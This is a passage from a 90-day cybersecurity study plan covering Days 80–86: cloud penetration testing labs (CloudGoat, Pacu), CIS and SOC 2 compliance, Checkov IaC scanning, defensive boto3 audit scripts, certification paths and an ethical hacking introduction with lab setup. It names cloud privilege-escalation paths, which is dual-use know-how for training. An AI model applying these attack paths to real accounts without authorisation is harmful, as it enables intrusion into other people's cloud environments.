In a real cloud penetration test, the first step after obtaining initial credentials is enumeration — what can these credentials access? What permissions do they have? What escalation paths are available? Pacu answers all three questions automatically and logs every action taken for the pentest report.

20 min · github.com/RhinoSecurityLabs/pacu — study the module list
yellow What to Learn Today What to Learn
Day 80 Checklist
  • 1Deploy CloudGoat 'iam_privesc_by_rollback' in your AWS account using Terraform
  • 2Follow the attack path: enumerate permissions → discover rollback → escalate to admin
  • 3Document every AWS CLI command executed and what it revealed at each step
  • 4Run `terraform destroy` immediately after completing the scenario
  • 5Enforce IMDSv2 on all EC2 instances in your account: HttpTokens=required
Total Day 80 Study Time: 120 – 150 minutes (full attack lab day)
resources_white Where to Learn Free Resources
Free Resources for Today
🧪 Lab CloudGoat — Deliberately Vulnerable AWS (Your Own Account) github.com/RhinoSecurityLabs/cloudgoat
🔧 Tool Pacu — AWS Exploitation Framework github.com/RhinoSecurityLabs/pacu
🧪 Lab flaws2.cloud — Free Advanced AWS Attacker-Path Challenge flaws2.cloud
📖 Guide HackTricks Cloud — AWS Security Attack Paths book.hacktricks.xyz/cloud-security/aws-security
white Action Plan How to Learn
Your Hands-On Task for Day 80
  • 1Install CloudGoat: `pip install cloudgoat` — deploy iam_privesc_by_rollback — follow the README instructions
  • 2Document every step: the starting credentials, each enumeration command, the escalation technique, the final admin access
  • 3Run `terraform destroy` IMMEDIATELY after completion — verify in AWS console that all resources are gone
  • 4Check CloudTrail — find every API call made during the CloudGoat scenario — see exactly what a real attack looks like in logs
Hands-On Task: 90 – 120 minutes
quote Pro Tip Pro Tip · Day 80
"Cloud penetration testing commands a 30–50% salary premium over traditional pentesting. The intersection of deep cloud architecture knowledge with offensive security skills is genuinely rare in the job market. Focus on one cloud provider's attack paths entirely before diversifying — AWS has the richest free lab ecosystem (CloudGoat, flaws.cloud, flaws2.cloud) and makes the ideal starting point."
Checking CloudTrail logs after completing a CloudGoat scenario is one of the highest-value learning activities of this entire phase. You just performed a real IAM privilege escalation — now look at exactly how it appears in the audit logs. Which API calls fired? What did the `userIdentity` field show? What sequence of events would alert a SOC analyst? This dual attacker-and-defender perspective — seeing the attack from both sides simultaneously — is what makes genuinely effective cloud security engineers.
⚠ Common Mistake
Forgetting to run terraform destroy after CloudGoat scenarios. A single forgotten NAT Gateway and EC2 instance left running generates $50+ in AWS charges within 24 hours. CloudGoat deploys real, billable AWS resources. After every scenario, run `cloudgoat destroy SCENARIO_NAME` and then verify in the AWS console that no EC2 instances, NAT Gateways, or RDS instances remain running in any region. Check AWS Cost Explorer the next day to confirm zero charges accumulated.
DAY 81
Cloud Compliance: CIS Benchmarks & IaC Security
Every enterprise cloud deployment must prove compliance. Here are the frameworks every cloud security professional must know cold.
#CloudCompliance#CISBenchmark#Day81of90
dark CIS Benchmarks for Cloud Foundation
CIS Benchmarks: The Universal Cloud Hardening Standard
CIS BenchmarksNIST CSFSOC 2

The Center for Internet Security publishes free hardening guides for AWS, Azure, and GCP — the CIS Cloud Benchmarks. These are the most widely referenced cloud security standards in enterprise environments. Any cloud security role at a company handling sensitive data will reference CIS Benchmark controls.

CIS AWS Foundations Benchmark v1.4 has four control levels — Level 1 is the required minimum baseline for any production account. It covers IAM configuration, logging requirements, monitoring alerts, networking settings, and S3 security. AWS Security Hub, GCP Security Command Center, and Azure Defender for Cloud all have built-in automated CIS checks — your compliance score is visible in the console right now.

NIST Cybersecurity Framework five functions: Identify (asset inventory, risk assessment) · Protect (access control, data security) · Detect (anomaly detection, SIEM) · Respond (incident response planning) · Recover (recovery planning, improvements). Every security control built in this 90-day series maps directly to one of these five functions.

20 min · cisecurity.org/benchmark — download the free PDFs
red Infrastructure as Code Security Shift Left
IaC Security: Find It in Code, Not in a Breach

Infrastructure as Code (Terraform, CloudFormation, Ansible) defines your cloud environment as version-controlled code. The security implication: misconfigurations in IaC files get deployed to production automatically — unless they are caught by scanning first.

# Install Checkov — free IaC security scanner: pip install checkov # Scan a directory of Terraform files: checkov -d ./terraform/ # Scan a specific file: checkov -f main.tf # Example findings Checkov catches: # CKV_AWS_20: S3 bucket has public read ACL # CKV_AWS_23: Security group allows all ports to 0.0.0.0/0 # CKV_AWS_16: RDS instance is not encrypted # CKV_AWS_86: CloudTrail is not enabled # CKV_AWS_119: DynamoDB not encrypted with KMS CMK # Fail build on any HIGH or CRITICAL finding: checkov -d . --check HIGH,CRITICAL --hard-fail-on CRITICAL

Shift left means catching security issues earlier in the development process. The cost of fixing a misconfiguration in code review is hours. The cost of fixing it after a breach investigation is measured in millions. Checkov in CI/CD makes this enforcement automatic and frictionless.

25 min · pip install checkov — scan your existing Terraform files
dark Checkov in CI/CD DevSecOps
Checkov in GitHub Actions: Block Insecure Merges
# .github/workflows/security-scan.yml name: IaC Security Scan on: push: branches: [main] pull_request: branches: [main] jobs: checkov-scan: runs-on: ubuntu-latest steps: - name: Checkout code uses: actions/checkout@v3 - name: Run Checkov IaC scan uses: bridgecrewio/checkov-action@master with: directory: terraform/ framework: terraform soft_fail: false # Block PR on CRITICAL findings output_format: sarif # Integrate with GitHub Security tab # Result: every PR with insecure Terraform is blocked # automatically before it can be merged to main

This is DevSecOps in practice. Security review happens automatically at the code level before any deployment. The engineer gets immediate feedback in the PR — not a security alert three weeks later after a cloud breach. This workflow is the standard at security-mature engineering organisations.

20 min · Add Checkov to your GitHub Actions workflow
white SOC 2 in Cloud Environments Enterprise Compliance
SOC 2: The Compliance Framework Enterprise Sales Demands

SOC 2 Type II is a Service Organization Controls audit evaluating security, availability, processing integrity, confidentiality, and privacy over a 6–12 month observation period. Enterprise SaaS companies require SOC 2 to win contracts with enterprise customers — it is a prerequisite for the sales process at most large organisations.

Cloud-native controls that directly satisfy SOC 2 requirements: CloudTrail/Cloud Logging for audit trail (CC6.2, CC7.2) · encryption at rest and in transit (CC6.7) · MFA enforcement policies (CC6.1) · Git-versioned change management (CC6.8) · incident response runbooks (CC7.3) · quarterly access reviews (CC6.3).

Compliance is the floor of security, never the ceiling. A system can be fully SOC 2 compliant and breached via a zero-day or social engineering the same week. Use compliance frameworks as a starting point for establishing baselines — not as a definition of 'secure'. The mindset is: compliance tells you the minimum. Security engineering tells you what's actually needed.

15 min · Download the CIS AWS Foundations Benchmark PDF — review Level 1 controls
yellow What to Learn Today What to Learn
Day 81 Checklist
  • 1Download the free CIS AWS Foundations Benchmark PDF — count how many Level 1 controls you have already implemented
  • 2Install Checkov: `pip install checkov` — run it against your existing Terraform or CloudFormation files
  • 3Write a Terraform file with three intentional misconfigurations: public S3 bucket + open security group + unencrypted RDS
  • 4Run `checkov -f main.tf` — verify it flags all three findings with the correct CKV IDs
  • 5Fix all three misconfigurations — re-run Checkov and confirm all checks pass
Total Day 81 Study Time: 90 – 120 minutes

🔧 Tool Checkov — Free IaC Security Scanner (Terraform/CF/Ansible) checkov.io
🔧 Tool tfsec — Terraform-Specific Security Scanner github.com/aquasecurity/tfsec
📄 NIST NIST Cybersecurity Framework — Free Official Site csf.nist.gov
white Action Plan How to Learn
Your Hands-On Task for Day 81
  • 1Install Checkov: `pip install checkov` — verify installation with `checkov --version`
  • 2Write main.tf with three misconfigurations: public S3 ACL + security group ingress 0.0.0.0/0 + RDS no encryption
  • 3Run `checkov -f main.tf` — screenshot the findings with their CKV IDs and severity levels
  • 4Fix all three — re-run Checkov — screenshot the all-pass output — this is your before/after compliance artifact
Hands-On Task: 60 – 75 minutes
quote Pro Tip Pro Tip · Day 81
"Compliance knowledge is a significant salary differentiator for cloud security roles at enterprise companies and regulated industries — finance, healthcare, government, and insurance all pay compliance premiums of 15–25%. Being able to say 'I understand CIS Benchmark controls, map them to our cloud environment, and use Checkov in our CI/CD pipeline to enforce them automatically before deployment' is a concrete, verifiable capability that commands higher compensation."
The before-and-after Checkov screenshots from today's lab are portfolio artifacts. A GitHub repo with a README showing: 'Initial scan: 3 CRITICAL findings. After remediation: 0 findings. All checks pass.' — with the actual Terraform code — demonstrates DevSecOps competence in a concrete, verifiable way. This type of contribution to a portfolio repo, linked from LinkedIn, consistently generates recruiter outreach from cloud security teams.
⚠ Common Mistake
Treating compliance as security. A CIS Benchmark Level 1 compliant account can still be breached through social engineering, zero-day vulnerabilities, insider threats, and supply chain attacks — none of which CIS Benchmark checks can detect or prevent. Use CIS as a configuration baseline and compliance starting point. Layer in GuardDuty, Security Hub, CloudTrail analysis, and incident response capability on top. Compliance tells you the minimum acceptable configuration. Security engineering tells you what's actually needed to detect and respond to real attacks.
DAY 82
Cloud Security Automation with Python & boto3
Manual cloud security checks don't scale. Python + cloud APIs = automated defense running 24/7 without you.
#boto3#CloudAutomation#Day82of90
dark boto3 — AWS SDK for Python Foundation
boto3: Every AWS Console Action, Now in Python
boto3LambdaEventBridge

boto3 is the official AWS Python SDK. Every action available in the AWS console — creating resources, modifying configurations, querying data, sending notifications — has an equivalent boto3 call you can automate. The Python skills from Phase 4 of this series apply directly here.

# Install and authenticate: pip install boto3 # Authentication options (use IAM Role in production): # 1. IAM Role on EC2/Lambda — credentials automatic, zero config # 2. Environment variables: # export AWS_ACCESS_KEY_ID=... # export AWS_SECRET_ACCESS_KEY=... # 3. ~/.aws/credentials file: aws configure import boto3 # Access different AWS services: ec2 = boto3.client('ec2') # EC2 API s3 = boto3.resource('s3') # S3 object-level API iam = boto3.client('iam') # IAM API cloudtrail = boto3.client('cloudtrail') # CloudTrail API # Test your connection: print(boto3.client('sts').get_caller_identity())

The distinction between boto3.client and boto3.resource: client provides lower-level API access returning raw JSON responses. resource provides a higher-level, object-oriented interface for supported services (S3, EC2, IAM, DynamoDB). Use resource for S3 operations — it is significantly cleaner to read and write.

20 min · boto3.amazonaws.com/v1/documentation/api/latest/index.html
red S3 Security Auditor Build It
S3 Auditor: 30 Lines That Check Every Bucket
import boto3 import csv def audit_s3_security(): s3 = boto3.client('s3') buckets = s3.list_buckets()['Buckets'] findings = [] for bucket in buckets: name = bucket['Name'] finding = {'bucket': name} # Check all 4 public access block settings: try: pab = s3.get_public_access_block(Bucket=name) config = pab['PublicAccessBlockConfiguration'] finding['block_public_acls'] = config.get('BlockPublicAcls') finding['block_public_policy'] = config.get('BlockPublicPolicy') except: finding['block_public_acls'] = 'NOT SET' # Check encryption: try: enc = s3.get_bucket_encryption(Bucket=name) finding['encryption'] = enc['ServerSideEncryptionConfiguration']\ ['Rules'][0]['ApplyServerSideEncryptionByDefault']['SSEAlgorithm'] except: finding['encryption'] = 'NONE' # Check versioning: ver = s3.get_bucket_versioning(Bucket=name) finding['versioning'] = ver.get('Status', 'Disabled') findings.append(finding) print(f"{'❌' if finding['encryption']=='NONE' else '✅'} {name}") return findings audit_s3_security()
30 min · Build and run this script against your account right now
dark Lambda + EventBridge Auto-Remediation Serverless Security
Auto-Remediation: Undo Misconfigurations in Seconds

The most powerful cloud security automation pattern: CloudTrail captures a dangerous API call → EventBridge rule triggers immediately → Lambda function checks if the action violates policy → if yes, automatically reverts the change AND sends a Slack alert to the security team.

# Lambda function — auto-revert open security group: import boto3 import json def lambda_handler(event, context): ec2 = boto3.client('ec2') detail = event['detail'] # Extract the security group change details sg_id = detail['requestParameters']['groupId'] ip_permissions = detail['requestParameters']['ipPermissions'] # Check if any rule allows 0.0.0.0/0 on sensitive ports for perm in ip_permissions.get('items', []): for cidr in perm.get('ipRanges', {}).get('items', []): if cidr.get('cidrIp') == '0.0.0.0/0': # Auto-revert: remove the offending rule ec2.revoke_security_group_ingress( GroupId=sg_id, IpPermissions=[perm] ) print(f'Auto-reverted open rule on {sg_id}')

This is how enterprise cloud security teams enforce policy at scale — not by manually checking consoles, but by automated responses that trigger faster than a human analyst can even read the alert. The entire pattern is serverless, requires no infrastructure maintenance, and costs effectively nothing on the AWS free tier.

20 min · Set up the EventBridge → Lambda auto-remediation pattern
white IAM Credential Report Automation Security Engineering
IAM Audit Automation: 40 Lines, Real Risk Reduction
import boto3 import base64 import csv import io def audit_iam_credentials(): iam = boto3.client('iam') # Generate and retrieve credential report: iam.generate_credential_report() response = iam.get_credential_report() csv_content = base64.b64decode( response['Content']).decode('utf-8') reader = csv.DictReader(io.StringIO(csv_content)) critical_findings = [] for user in reader: # Flag users with console access and no MFA: if (user['password_enabled'] == 'true' and user['mfa_active'] == 'false'): critical_findings.append({ 'user': user['user'], 'issue': 'Console access with NO MFA' }) # Flag stale access keys (unused 90+ days): for key_num in ['1', '2']: last_used = user.get(f'access_key_{key_num}_last_used_date') if last_used and last_used != 'N/A': # Add date comparison logic here pass return critical_findings findings = audit_iam_credentials() for f in findings: print(f"CRITICAL: {f['user']} — {f['issue']}")
25 min · Run the IAM credential report automation against your account
yellow What to Learn Today What to Learn
Day 82 Checklist
  • 1Build the S3 Security Auditor — run it against every bucket in your account — export to CSV
  • 2Build the IAM credential report script — flag every user with console access and no MFA
  • 3Push both scripts to your GitHub cybersecurity-tools repo with a detailed README
  • 4Understand the EventBridge → Lambda auto-remediation pattern — draw the architecture
  • 5Test the auto-remediation concept: manually open a security group → Lambda reverts it within seconds
Total Day 82 Study Time: 90 – 120 minutes
resources_white Where to Learn Free Resources
Free Resources for Today

📖 Docs GCP Python SDK — google-cloud Documentation cloud.google.com/python/docs
🔧 Source Prowler Source Code — Python AWS Security Auditor github.com/toniblyx/prowler
📖 Docs Azure Python SDK — azure-identity Documentation azure.microsoft.com/en-us/develop/python
white Action Plan How to Learn
Your Hands-On Task for Day 82
  • 1Build the S3 Security Auditor: list all buckets → check public access block → check encryption → check versioning → export CSV
  • 2Build the IAM credential audit: generate report → parse CSV → flag no-MFA console users and stale keys
  • 3Push both scripts to GitHub with a README — 'Security automation tools — Python + boto3'
  • 4Document the findings from your own account — note how many buckets and users each script flagged
Hands-On Task: 90 – 120 minutes
quote Pro Tip Pro Tip · Day 82
"Python + cloud SDK automation is what separates a $70k cloud security analyst from a $120k cloud security engineer. The ability to write tools that continuously enforce security policy at scale — rather than manually clicking through consoles — is a categorically different skill level. The S3 auditor built today can be deployed as an AWS Lambda on a daily schedule for $0, running automated compliance checks every 24 hours forever."
The S3 auditor script in your GitHub repo is a real portfolio artifact that demonstrates both Python proficiency and cloud security knowledge simultaneously in a single concrete deliverable. When applying for cloud security roles, this is the kind of project to reference specifically: 'I built a Python boto3 script that audits every S3 bucket in an AWS account for public access configuration, encryption status, and versioning — runs as a scheduled Lambda at zero cost.' That one sentence describes a real security engineering project, not a certification.
⚠ Common Mistake
Granting Lambda functions AdministratorAccess for simplicity. A Lambda with admin permissions that has a code vulnerability or injection flaw becomes an attack tool against your own AWS account. An attacker who exploits the Lambda can use its permissions to do anything in your account. Always grant Lambda execution roles the minimum permissions needed for the specific task — a Lambda that only needs to list S3 buckets and call GetPublicAccessBlock needs exactly those two permissions and nothing else.
DAY 83
Cloud Security Certifications & Career Paths
Cloud security certs are the highest-ROI certifications in all of cybersecurity right now. Here's the exact path to take.
#CloudCertifications#CloudSecurityCareer#Day83of90
dark AWS Certification Path AWS Track
AWS Certs: Three Steps to Security Specialist
AWS Security SpecialtySC-200CCSP

AWS Cloud Practitioner ($100, approximately 2 weeks study) — cloud fundamentals, shared responsibility, service overview. The foundation for non-technical stakeholders and a credibility baseline for technical candidates who want to prove they know AWS beyond hands-on usage. Free study via AWS Skill Builder.

AWS Solutions Architect Associate ($300) — the most popular AWS certification globally. Covers architecture fundamentals, service selection, cost optimisation, and security at the design level. Recommended before the Security Specialty — the architecture knowledge makes security decisions significantly more intuitive.

AWS Security Specialty SCS-C02 ($300) — the highest-value cloud security certification for AWS-focused roles. Tests: IAM and access control, infrastructure security, data protection, incident response, and threat detection. Average salary for holders: $120k+. Free study: AWS Skill Builder + freeCodeCamp YouTube courses for all three levels.

20 min · aws.amazon.com/certification
red Azure Certification Path Azure Track
Azure Certs: SC-200 is the Hottest Cert Right Now
AZ-900 Azure Fundamentals ($165) — cloud concepts, Azure services overview, pricing and SLA. The fastest credential to baseline Azure knowledge. Free complete study path on Microsoft Learn with no lab subscription needed.
AZ-500 Azure Security Engineer Associate — hands-on security engineering exam covering Entra ID, network security, data and application security, and security operations. Recommended for practitioners who want technical depth before the SC-200.
SC-200 Security Operations Analyst — Sentinel and Defender XDR focused. The most in-demand Microsoft security certification right now. KQL is the key skill gap most candidates have. Salary range: $80–120k for roles requiring this certification.

Every Azure certification has a completely free study path with sandbox labs on learn.microsoft.com. No Azure subscription needed. The free sandbox environments provide real Azure access for the duration of each learning module.

15 min · learn.microsoft.com — check the SC-200 learning path
dark GCP and Vendor-Neutral Paths GCP + Enterprise Certs
GCP + CCSP: Premium Certs for Senior Roles

GCP Certification path: Google Cloud Digital Leader (business-focused foundations) → Associate Cloud Engineer (practical hands-on engineering) → Professional Cloud Security Engineer (architecture-level, most valued GCP security cert, commands $130k+ average). Google Cloud Skills Boost provides free guided learning paths with monthly lab credits.

CCSP (Certified Cloud Security Professional) by ISC2 — the premium vendor-neutral cloud security certification. $599 exam, requires 5 years of work experience (with ISC2 associate path available for those without experience). Widely required for senior cloud security architect roles at enterprise companies and government contractors. The gold standard certification for cloud security leadership roles.

CCSK (Certificate of Cloud Security Knowledge) by CSA — $395, the most accessible advanced cloud certification for candidates building toward CCSP. Vendor-neutral, covers cloud architecture, governance, compliance, and operations. A strong addition to any cloud security resume alongside a platform-specific certification.

20 min · cloudskillsboost.google — review Professional Cloud Security Engineer requirements
white Cloud Security Career Roles Career Map
Cloud Security Roles: Five Paths, All Actively Hiring

Cloud Security Engineer ($110–150k) — builds and maintains security controls in cloud environments. Day-to-day: implementing IAM policies, security group rules, logging configurations, automated compliance checks. Entry into this role typically requires one cloud certification and hands-on lab experience.

Cloud Penetration Tester ($100–145k) — offensive testing of cloud environments. Requires deep knowledge of cloud architecture combined with attack technique knowledge. CloudGoat and flaws.cloud experience is directly relevant. Commands a 30–50% salary premium over traditional pentesting.

Cloud Security Architect ($140–200k) — designs security at organisational scale. Requires 5+ years of combined cloud and security experience, communication skills for executive stakeholders, and the ability to make security design decisions that scale across hundreds of teams. The long-term target role.

DevSecOps Engineer ($120–160k) — integrates security into CI/CD pipelines. Checkov in GitHub Actions, container scanning in build pipelines, secrets management for deployment pipelines. The intersection of development workflow knowledge and security engineering.

15 min · Research open roles for each of these titles on LinkedIn
yellow What to Learn Today What to Learn

  • 2Create a 30-day study plan with daily hours, specific resources per domain, and practice exam schedule
  • 3Post your study plan publicly on LinkedIn — public accountability dramatically increases completion rates
  • 4Identify 10 cloud security job postings that match your target role — note every tool and certification mentioned
  • 5Compare those requirements against your current skill set — note the specific gaps to close first

white Action Plan How to Learn
Your Hands-On Task for Day 83
  • 1Research your target certification: exam guide → domain breakdown → question count → passing score → recommended experience
  • 2Build a 30-day study plan: Day 1–7 (Domain 1), Day 8–14 (Domain 2), Day 15–21 (Domain 3), Day 22–28 (practice exams), Day 29–30 (review gaps)
  • 3Post the study plan on LinkedIn — tag the certification and use relevant hashtags — this creates accountability
  • 4Add cloud security skills to your LinkedIn profile: AWS IAM, Elastic Security, CloudTrail, GuardDuty, Docker Security, Kubernetes Security, Python boto3
Hands-On Task: 60 – 90 minutes
quote Pro Tip Pro Tip · Day 83
"The highest-ROI certification decision based on your target environment: working at a Microsoft-heavy enterprise → SC-200 first. Targeting AWS-focused startups or wanting the richest lab ecosystem → AWS Security Specialty. Wanting maximum long-term salary ceiling in large enterprises → CCSP after 2+ years of hands-on cloud experience. Choose based on your specific target environment, not just certification popularity rankings."
Cloud certifications expire. AWS and Azure require renewal every 3 years. GCP every 2 years. Factor renewal exam costs and continuing education into your long-term certification strategy from the beginning. The best approach: set a calendar reminder 6 months before expiry, use that window to catch up on new service features that were added since you originally certified, then renew. Treating renewal as ongoing professional development — rather than an annoying administrative task — keeps your knowledge current and your credential valid.
⚠ Common Mistake
Choosing a certification based on which one is cheapest or fastest to pass rather than which one aligns with your specific target job market. The AWS Cloud Practitioner is the easiest AWS certification — but it does not qualify you for security engineer roles. The SC-200 requires real KQL proficiency — but it opens doors that AZ-900 does not. Invest study time in the certification that matches the role you actually want, not the one that looks most achievable right now.
DAY 84
Cloud Security Phase Recap & Portfolio Project
2 weeks of cloud security COMPLETE. 84 days in. Document everything and build your portfolio. Ethical Hacking starts tomorrow.
#CloudSecurityRecap#SecurityPortfolio#Day84of90
dark Phase 8 Full Recap Summary
14 Days of Cloud Security: What You Built
SIEM BuiltPortfolio LiveNext: Ethical Hacking
Day 71: Shared responsibility model — IaaS/PaaS/SaaS security boundaries, top cloud attack vectors, CSPM tools (Prowler, Scout Suite), cloud platform selection.
Day 72: AWS IAM — users, roles, policies, least privilege, IAM Access Analyzer, flaws.cloud hands-on lab, credential report audit.
Day 73: S3 bucket security, Block Public Access, VPC architecture (public/private subnets, NAT Gateway), security groups, CLI audit commands.
Day 74: CloudTrail audit logging, GuardDuty ML threat detection, Security Hub CIS Benchmark compliance — the minimum viable AWS monitoring stack.
Day 75: GCP IAM hierarchy, service accounts, Cloud Logging and audit logs, Security Command Center, IAM Recommender, firewall rules.
Day 76: Azure Entra ID, Conditional Access, PIM, Defender for Cloud Secure Score, Microsoft Sentinel, KQL queries for security analysis.
Day 77: Zero Trust principles (NIST SP 800-207), cloud secrets management, WAF deployment, defence in depth seven-layer architecture.
Day 78: Docker container security model, privileged flag and docker.sock risks, Trivy image scanning, Docker Bench CIS audit, image hardening.
Day 79: Kubernetes RBAC, network policies for pod isolation, kube-bench CIS audit, six common K8s attack paths, minikube lab.
Day 80: Cloud pentest legal requirements, SSRF to IMDS attack, CloudGoat deliberately vulnerable AWS, IAM privilege escalation paths, Pacu framework.
Day 81: CIS Benchmarks, NIST CSF, SOC 2 cloud controls, Checkov IaC scanning, GitHub Actions DevSecOps pipeline.
Day 82: Python boto3 automation, S3 security auditor, IAM credential report automation, Lambda + EventBridge auto-remediation pattern.
Day 83: Cloud certification roadmaps (AWS, Azure, GCP, CCSP), five cloud security career roles and salary ranges, study plan creation.
30 min · Review your notes from all 14 days before building the portfolio project
red Portfolio Project — Secure Cloud Architecture Portfolio Centerpiece
Portfolio Project: The GitHub Repo That Wins Interviews

Build and document a securely architected cloud environment on GitHub. This single repository — with working Terraform, a professional README, an architecture diagram, and documented security controls — demonstrates more practical capability to a cloud security hiring manager than most training certificates.

Required components: VPC with public and private subnets · EC2 in private subnet with no public IP · S3 with encryption and versioning and all public access blocked · IAM role for EC2 with minimum required permissions · CloudTrail enabled with S3 logging and integrity validation · Security group with minimal open ports · All infrastructure defined as Terraform code passing a full Checkov scan with zero CRITICAL findings.

The Security Controls section of your README must: list every implemented control, map it to the specific threat it mitigates, and cite the relevant CIS Benchmark control number. This section demonstrates that you understand why each control exists — not just how to configure it.

90+ min · This is today's primary deliverable — allocate most of your session here
dark Architecture Diagram Requirement Visual Communication
Architecture Diagram: Draw It Before You Present It

Every cloud security portfolio project needs a visual architecture diagram. Free tools with cloud icon libraries built in: draw.io (cloud-native, supports official AWS/GCP/Azure icon sets, exports to PNG/SVG) · Excalidraw (clean hand-drawn style, excellent for whiteboard-style architecture presentations) · Lucidchart free tier.

Your diagram must show: VPC boundary and subnet divisions with CIDR labels · security group boundaries drawn around the EC2 instances they protect · data flow direction arrows showing where traffic can and cannot go · encryption indicators (lock icon) on S3 and any encrypted data stores · NAT Gateway positioned on the public subnet with arrow showing outbound-only direction from private.

Embed the diagram directly in your GitHub README using a PNG export. GitHub renders images inline in README files. The diagram should be visible immediately when anyone opens your repository without clicking into any subdirectory. Engineers who can draw infrastructure from memory in interviews consistently outperform those who only know console clicks.

30 min · draw.io — build your VPC architecture diagram before writing any Terraform
white LinkedIn Update for Phase 8 Career Documentation
LinkedIn Update: Make Your Portfolio Discoverable

Add 'Cloud Security' to your LinkedIn Skills section and endorse the specific tools you used this phase: AWS IAM, Amazon GuardDuty, AWS CloudTrail, Docker Security, Kubernetes Security, Python boto3, Terraform, Checkov, Microsoft Sentinel, KQL.

Write a LinkedIn post with your architecture diagram — include a 3-paragraph write-up: what you built, which specific security controls you implemented and why, and one concrete lesson from the phase. Tag: #CloudSecurity #AWS #DevSecOps #Cybersecurity #InfrastructureAsCode. Cloud security hiring managers at top firms actively search and monitor these exact tags.

The resume bullet point to add today: 'Built and documented a securely architected cloud environment using AWS — implemented IAM least privilege, VPC network segmentation, CloudTrail audit logging, GuardDuty threat detection, and IaC security scanning with Checkov in a CI/CD pipeline. All infrastructure defined in Terraform with zero CRITICAL security findings.'

30 min · Post the LinkedIn update before moving to Phase 9

stats Phase 8 Complete Progress Stats

quote Pro Tip Pro Tip · Day 84
"A GitHub repo with working Terraform deploying a securely architected cloud environment — all-pass Checkov scan results, a professional README, a clear architecture diagram, and a documented security controls section — demonstrates more practical capability to a cloud security hiring manager than most training certificates. It proves you can build and secure cloud infrastructure, not just study about it."
Phase 9 — Ethical Hacking — is where everything converges. Networking from Phase 1 tells you what traffic looks like. Linux from Phase 3 tells you how systems work internally. Python from Phase 4 gives you automation for custom tools. Traffic analysis from Phase 5 shows you what attacks look like on the wire. Cloud knowledge from Phase 8 gives you the defensive context. You understand what defenders see. Now you learn how attackers think and move. Everything you built matters for what comes next.
⚠ Common Mistake
Leaving cloud lab resources running when Phase 9 starts. Check every cloud account you used this phase: AWS Cost Explorer, GCP Billing dashboard, Azure Cost Management. Delete every EC2 instance, NAT Gateway, RDS instance, and any other paid service. Unused cloud resources accumulate charges silently and indefinitely — they do not stop billing when you stop using them. Run `terraform destroy` on every CloudGoat deployment and any other Terraform-managed infrastructure before starting Day 85.
9
Phase 09
Ethical Hacking
Days 85–90 · 6 sessions
DAY 85
Ethical Hacking Methodology & Legal Framework
Day 85. The final phase. Everything you have built over 84 days leads here. Ethical hacking starts NOW.
#EthicalHacking#Pentesting#Day85of90
dark What is Ethical Hacking? Foundation
Ethical Hacking: Same Skills, Legal Context
AuthorisationPentest PhasesLegal Framework

Ethical hacking is the authorised simulation of real attacks to find vulnerabilities before malicious hackers do. Same exact techniques as criminal hackers — completely different legal context.

The only difference between a penetration tester and a criminal is a single document: written, signed authorisation from the system owner. Without it, every technique this week is a federal crime.

You are not a beginner entering this phase. After 84 days you understand networking at packet level, write Python automation tools, operate Linux fluently, analyse malware traffic, and build SIEMs. You are an informed attacker-defender who understands both sides — that combination is rare and valuable.

20 min · TCM Security Practical Ethical Hacking — Part 1 (YouTube, free)
red Pentest Phases (PTES) Methodology
PTES: 6 Phases of Every Engagement
Phase 1 — Pre-engagement: Define scope, rules of engagement, testing windows, emergency contacts, and what happens if a critical vulnerability is found mid-test.
Phase 2 — Reconnaissance: Passive OSINT and active intelligence gathering — map the entire attack surface before touching a single exploit.
Phase 3 — Scanning: Port scanning, service enumeration, vulnerability scanning — identify exactly what is running and what versions.
Phase 4 — Exploitation: Use discovered vulnerabilities to gain initial access — always within the agreed scope.
Phase 5 — Post-Exploitation: Persistence, lateral movement, privilege escalation, data access — simulate what a real attacker would do after initial compromise.
Phase 6 — Reporting: Document every finding with evidence, CVSS score, reproduction steps, and remediation. The report IS the deliverable.
20 min · TCM Security Practical Ethical Hacking Part 1
dark Types of Pentests Engagement Types
Pentest Types: Know the Difference
Black Box: No prior knowledge — simulates a real external attacker starting from zero. Most realistic external threat simulation.
Gray Box: Some knowledge provided — like an employee account or network diagram. Most common engagement type. Balances realism and efficiency.
White Box: Full access — source code, architecture diagrams, credentials. Most thorough. Finds the most vulnerabilities in the least time.

Pentest domains: Network · Web Application · Mobile · Cloud · Physical · Social Engineering. Each has different methodology, tools, and report deliverables. This week focuses on network and web application pentesting — the two highest-demand specialisations.

15 min · TCM Security Part 1 — Pentest Types Section
white Legal Framework Non-Negotiable
Legal Framework: Never Skip This

Always get a signed Statement of Work + Rules of Engagement before ANY testing activity. Define exactly: in-scope IP ranges and domains, out-of-scope systems, testing time windows, emergency contact escalation procedure, and what happens if a critical vulnerability is found mid-test.

# Rules of Engagement must define: In-scope: 192.168.1.0/24, app.target.com Out-of-scope: *.production.target.com Testing window: Mon–Fri 18:00–06:00 UTC only Emergency contact: CISO +1-555-0100 (24/7) Critical vuln found: Stop and notify within 1 hour

Testing even one IP outside scope = potential Computer Fraud and Abuse Act (CFAA) violation. Not a grey area — a federal crime. Get everything in writing, confirm scope with the client before every session.

15 min · Read: CFAA overview and scope management best practices
yellow Pentest Certifications Career Path
Day 85 Checklist
  • 1Download and install Kali Linux in VirtualBox — kali.org/get-kali → Installer Images
  • 2Download Metasploitable2 from sourceforge.net — the intentionally vulnerable lab target VM
  • 3Configure both VMs on an isolated host-only network in VirtualBox — zero internet access
  • 4Verify connectivity: boot Kali → `ping Metasploitable2_IP` → confirm you can reach it
  • 5Understand the 4 pentest cert levels: eJPT (beginner) → PNPT (practical, best value) → CEH (recognised) → OSCP (gold standard)
Total Day 85 Study Time: 90 – 120 minutes (includes lab setup)

white Action Plan How to Learn
Your Hands-On Task for Day 85
  • 1Install Kali Linux in VirtualBox → take a snapshot immediately after first boot
  • 2Download Metasploitable2 → import into VirtualBox → set network to Host-Only
  • 3Set Kali to the same Host-Only network → boot both VMs
  • 4Verify lab: `ping` from Kali to Metasploitable2 — both must see each other with zero internet access
Hands-On Task: 60 – 90 minutes (lab setup)
quote Pro Tip Pro Tip · Day 85
"Every technique this week is practiced ONLY against your own lab VMs. Using these techniques against any other system without explicit written permission — even just to test — is a federal crime in most countries. No exceptions."
After 84 days of preparation, you enter this phase with more foundational knowledge than most people who attempt OSCP. Networking theory, Python automation, Linux fluency, traffic analysis, SIEM operations, and cloud security — all feed directly into penetration testing methodology. You have been building toward this week since Day 1.
⚠ Common Mistake
Setting up the hacking lab on a bridged network instead of host-only. Bridged mode connects your vulnerable VMs to your real home network — other devices on your network (including neighbours on shared networks) could potentially reach Metasploitable2's intentional vulnerabilities. Always use isolated host-only networking for lab VMs.
DAY 86
Reconnaissance: OSINT, Nmap & Active Scanning
